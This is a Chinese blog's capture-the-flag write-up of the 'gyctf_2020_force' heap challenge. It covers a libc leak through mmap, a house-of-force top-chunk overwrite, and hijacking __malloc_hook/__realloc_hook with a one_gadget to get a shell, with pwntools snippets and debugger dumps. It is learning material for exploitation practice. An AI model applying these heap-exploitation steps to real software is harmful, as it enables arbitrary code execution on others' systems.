@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>gyctf_2020_force | Shuwen&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言 搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，， 没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force  程序流程堆体，，，只有一个功能（puts函数没有用）  对于add  分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gyctf_2020_force">
+<meta property="og:url" content="http://yoursite.com/2021/04/27/%C2%96gyctf-2020-force/index.html">
+<meta property="og:site_name" content="Shuwen&#39;s blog">
+<meta property="og:description" content="前言 搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，， 没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force  程序流程堆体，，，只有一个功能（puts函数没有用）  对于add  分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆">
+<meta property="og:image" content="http://yoursite.com/2021/04/27/%C2%96gyctf-2020-force/image-20210427211531288.png">
+<meta property="og:image" content="http://yoursite.com/2021/04/27/%C2%96gyctf-2020-force/image-20210427211635840.png">
+<meta property="article:published_time" content="2021-04-27T15:47:06.000Z">
+<meta property="article:modified_time" content="2021-04-27T15:55:44.586Z">
+<meta property="article:author" content="winter">
+<meta property="article:tag" content="house of force">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/04/27/%C2%96gyctf-2020-force/image-20210427211531288.png">
+  
+    <link rel="alternate" href="../../../../atom.xml" title="Shuwen&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="../../../../css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="../../../../index.html" id="logo">Shuwen&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="../../../../index.html" id="subtitle">爱学习的书文</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="../../../../index.html">Home</a>
+        
+          <a class="main-nav-link" href="../../../../archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-gyctf-2020-force" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time datetime="2021-04-27T15:47:06.000Z" itemprop="datePublished">2021-04-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/buu/">buu</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      gyctf_2020_force
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<p><del>搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，，</del></p>
+<p>没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force</p>
+</blockquote>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>堆体，，，只有一个功能（puts函数没有用）</p>
+<p><img src="/2021/04/27/%C2%96gyctf-2020-force/image-20210427211531288.png" alt="image-20210427211531288"></p>
+<p>对于add</p>
+<blockquote>
+<p>分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆溢出</p>
+</blockquote>
+<p><img src="/2021/04/27/%C2%96gyctf-2020-force/image-20210427211635840.png" alt="image-20210427211635840"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于题目是保护全开，所以不能覆盖got表</p>
+<p>方法：</p>
+<ol>
+<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
+<li>正常分配堆块 =&gt; 泄露堆地址</li>
+<li>覆写top chunk‘size为0xffffffffffffffff，就可以将top chunk指针抬高</li>
+<li>使top chunk落在<code>__malloc_hook</code>附近，修改<code>__malloc_hook</code>和<code>__realloc_hook</code><ul>
+<li><code>__malloc_hook</code> =&gt; __realloc_hook + 0x10（为了满足one_gadget的限制） </li>
+<li><code>__realloc_hook</code> =&gt; one_gadget</li>
+</ul>
+</li>
+<li>malloc一下 =&gt; getshell</li>
+</ol>
+<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
+<p>保护全开，故考虑覆盖__malloc_hook</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file gyctf_2020_force </span><br><span class="line">gyctf_2020_force: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;6d464fea7805860b83ff9bc8f4467dd258ebd04f, stripped</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_force </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-分配大块"><a href="#1-分配大块" class="headerlink" title="1.分配大块"></a>1.分配大块</h4><blockquote>
+<p>分配一个0x200000的超大块，启用mmap分配，与libc的偏移固定，并计算得到libc_base</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x7ff0e84e4010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e84e4000</span><br><span class="line">0x7ff0e84e4000:	0x0000000000000000	0x0000000000201002</span><br><span class="line">0x7ff0e84e4010:	0x000a7265746e6977	0x0000000000000000</span><br><span class="line">0x7ff0e84e4020:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x7ff0e84e4010</span><br><span class="line">0x7ff0e84e4010:	&quot;winter\n&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x559a9f799000     0x559a9f79a000 r-xp     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99a000     0x559a9f99b000 r--p     1000 1000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99b000     0x559a9f99c000 rw-p     1000 2000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x7ff0e84e4000     0x7ff0e86e5000 rw-p   201000 0      </span><br><span class="line">    0x7ff0e86e5000     0x7ff0e88a5000 r-xp   1c0000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e88a5000     0x7ff0e8aa5000 ---p   200000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa5000     0x7ff0e8aa9000 r--p     4000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa9000     0x7ff0e8aab000 rw-p     2000 1c4000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aab000     0x7ff0e8aaf000 rw-p     4000 0      </span><br><span class="line">    0x7ff0e8aaf000     0x7ff0e8ad5000 r-xp    26000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cb8000     0x7ff0e8cbb000 rw-p     3000 0      </span><br><span class="line">    0x7ff0e8cd4000     0x7ff0e8cd5000 r--p     1000 25000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd5000     0x7ff0e8cd6000 rw-p     1000 26000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd6000     0x7ff0e8cd7000 rw-p     1000 0      </span><br><span class="line">    0x7fffae287000     0x7fffae2a8000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7fffae2c0000     0x7fffae2c3000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7fffae2c3000     0x7fffae2c5000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] libc_base:0x7ff0e86e5000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_addr  = add(<span class="number">0x200000</span>,<span class="string">'winter'</span>)</span><br><span class="line"><span class="comment">#0x7f52f5a7d000 - 0x7f52f587c010 = 0x200FF0</span></span><br><span class="line">libc_base = <span class="number">0x200FF0</span> + bin_addr</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-正常分配"><a href="#2-正常分配" class="headerlink" title="2.正常分配"></a>2.正常分配</h4><blockquote>
+<p>正常分配，得到的地址，是heap的基地址，因为申请0x18的大小，故top chunk就在heap_base+0x10</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x559aa0cf3010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0xffffffffffffffff</span><br><span class="line">0x559aa0cf3030:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] heap_base:0x559aa0cf3010</span><br><span class="line">[+] top_chunk:0x559aa0cf3020</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">0x18</span>,payload)</span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heap_base))</span><br><span class="line">top_chunk = heap_base + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">"top_chunk:"</span>+hex(top_chunk))</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-分配到malloc附近"><a href="#3-分配到malloc附近" class="headerlink" title="3.分配到malloc附近"></a>3.分配到malloc附近</h4><blockquote>
+<p><code>__malloc_hook</code>-0x33附近有\x7f，故分配到这里</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0x00002a5647db6ad1</span><br><span class="line">0x559aa0cf3030:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x559aa0cf3040:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = malloc_hook - top_chunk - <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">add(target,<span class="string">'aaaa'</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b20 - 0x33 - 5</span><br><span class="line">0x7ff0e8aa9ae8 &lt;_IO_wide_data_0+296&gt;:	0x0000000000000000	0x00007ff0e8aa8260</span><br><span class="line">0x7ff0e8aa9af8:	0xffffd5a9b8249529	0x00007ff0e876aea0</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e876aa70	0x0000000000000000</span><br><span class="line">0x7ff0e8aa9b18:	0x0000000000000000	0x0000000100000000</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-覆写-malloc-hook"><a href="#4-覆写-malloc-hook" class="headerlink" title="4.覆写__malloc_hook"></a>4.覆写__malloc_hook</h4><blockquote>
+<p>用gadget覆写malloc_hook，为了调节栈帧（<a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">参考博客</a>），还覆写realloc_hook。</p>
+<ul>
+<li>realloc_hook =&gt; one_gadget</li>
+<li>malloc_hook =&gt; realloc_hook + 0x10</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b0d - 5</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e872a27a	0x00007ff0e8769720</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">realloc_data = one_gadget[<span class="number">1</span>] + libc_base</span><br><span class="line">malloc_data = realloc + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaaaaaaa'</span> + p64(realloc_data) + p64(malloc_data))</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-malloc-gt-getshell"><a href="#5-malloc-gt-getshell" class="headerlink" title="5.malloc =&gt; getshell"></a>5.malloc =&gt; getshell</h4><blockquote>
+<p>执行一次malloc操作，即可get shell</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"puts"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"size"</span>)</span><br><span class="line">p.sendline(str(<span class="number">24</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
+<li>house of force</li>
+<li>realloc调节栈帧</li>
+</ol>
+<h3 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><p>参考博客：</p>
+<ul>
+<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105522043" target="_blank" rel="noopener">BUUCTF-PWN gyctf_2020_force（house of force）</a></li>
+<li><a href="https://www.cnblogs.com/zhwer/p/14135734.html" target="_blank" rel="noopener">gyctf_2020_force | House of force</a></li>
+</ul>
+<p>下载：</p>
+<table>
+<thead>
+<tr>
+<th align="center">文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><a href="gyctf_2020_force">文件</a></td>
+</tr>
+<tr>
+<td align="center"><a href="libc-2.23.so">LIBC</a></td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/04/27/%C2%96gyctf-2020-force/" data-id="cl03lvj570035ewjn8ydx1ndk" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/house-of-force/" rel="tag">house of force</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="../../30/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          软件安装
+        
+      </div>
+    </a>
+  
+  
+    <a href="../../25/wdb-2018-2nd-easyfmt%E8%AF%A6%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">wdb_2018_2nd_easyfmt详解</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/advanced-pwn/">advanced pwn</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/blockchain/">blockchain</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/book/">book</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/buu/">buu</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/chrome/">chrome</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/ida/">ida</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/iot/">iot</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/v8/">v8</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E4%B8%93%E9%A2%98/">专题</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%88%86%E4%BA%AB/">分享</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%A4%8D%E7%8E%B0/">复现</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%B7%A5%E5%85%B7/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6/">常用软件</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E6%80%BB%E7%BB%93/">总结</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E7%AE%97%E6%B3%95/">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/book/" rel="tag">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/buu%E5%88%B7%E9%A2%98/" rel="tag">buu刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/c-%E5%9F%BA%E7%A1%80/" rel="tag">c++基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ciscn/" rel="tag">ciscn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/csapp/" rel="tag">csapp</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/dasctf/" rel="tag">dasctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/double-free/" rel="tag">double free</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/fastbin-attack/" rel="tag">fastbin attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/flair/" rel="tag">flair</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/fmt/" rel="tag">fmt</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/googlectf-2020/" rel="tag">googlectf 2020</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/house-of-force/" rel="tag">house of force</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/kernel-pwn/" rel="tag">kernel pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/leetcode/" rel="tag">leetcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mips-pwn/" rel="tag">mips pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/off-by-one/" rel="tag">off by one</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/srop/" rel="tag">srop</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/unsortedbin-attack/" rel="tag">unsortedbin attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/v8/" rel="tag">v8</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E3%80%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E3%80%8B/" rel="tag">《操作系统真相还原》</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E4%BA%BA%E7%94%9F/" rel="tag">人生</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/" rel="tag">出题环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/" rel="tag">基础练习</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/" rel="tag">天梯赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%AE%89%E8%A3%85/" rel="tag">安装</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E6%8E%A8%E5%85%8D/" rel="tag">推免</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" rel="tag">漏洞基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/" rel="tag">蓝桥杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/" rel="tag">西南科技大学新生赛</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="../../../../tags/book/" style="font-size: 10px;">book</a> <a href="../../../../tags/buu%E5%88%B7%E9%A2%98/" style="font-size: 20px;">buu刷题</a> <a href="../../../../tags/c-%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">c++基础</a> <a href="../../../../tags/ciscn/" style="font-size: 10px;">ciscn</a> <a href="../../../../tags/csapp/" style="font-size: 13.33px;">csapp</a> <a href="../../../../tags/dasctf/" style="font-size: 10px;">dasctf</a> <a href="../../../../tags/double-free/" style="font-size: 10px;">double free</a> <a href="../../../../tags/fastbin-attack/" style="font-size: 10px;">fastbin attack</a> <a href="../../../../tags/flair/" style="font-size: 10px;">flair</a> <a href="../../../../tags/fmt/" style="font-size: 10px;">fmt</a> <a href="../../../../tags/git/" style="font-size: 10px;">git</a> <a href="../../../../tags/googlectf-2020/" style="font-size: 10px;">googlectf 2020</a> <a href="../../../../tags/house-of-force/" style="font-size: 13.33px;">house of force</a> <a href="../../../../tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="../../../../tags/kernel-pwn/" style="font-size: 13.33px;">kernel pwn</a> <a href="../../../../tags/leetcode/" style="font-size: 13.33px;">leetcode</a> <a href="../../../../tags/mips-pwn/" style="font-size: 10px;">mips pwn</a> <a href="../../../../tags/off-by-one/" style="font-size: 10px;">off by one</a> <a href="../../../../tags/pwn/" style="font-size: 10px;">pwn</a> <a href="../../../../tags/pwnable-tw/" style="font-size: 13.33px;">pwnable.tw</a> <a href="../../../../tags/srop/" style="font-size: 10px;">srop</a> <a href="../../../../tags/unlink/" style="font-size: 13.33px;">unlink</a> <a href="../../../../tags/unsortedbin-attack/" style="font-size: 10px;">unsortedbin attack</a> <a 